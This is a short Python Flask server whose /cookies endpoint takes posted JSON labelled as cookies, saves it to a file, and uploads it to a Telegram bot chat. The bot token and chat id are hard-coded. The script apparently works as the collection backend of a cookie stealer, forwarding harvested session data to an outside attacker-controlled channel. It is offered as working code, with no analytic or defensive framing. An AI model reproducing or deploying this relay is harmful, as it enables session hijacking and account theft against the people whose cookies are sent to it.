import os
import requests

from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def hello():
    return 'Hello World!'

@app.route('/cookies', methods=['POST'])
def cookies():
    data = request.get_json()
    with open('cookies.txt', 'w') as f:
        f.write('{}\n'.format(data));
    with open('cookies.txt', 'rb') as f:
        r = requests.post('https://api.telegram.org/bot1408870234:AAE2GSuLRsf8zo9dAvs3AC0yh89dE_Q13JA/sendDocument', data={'chat_id': 244270350}, files={'document': f})
        print(r.text)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
 
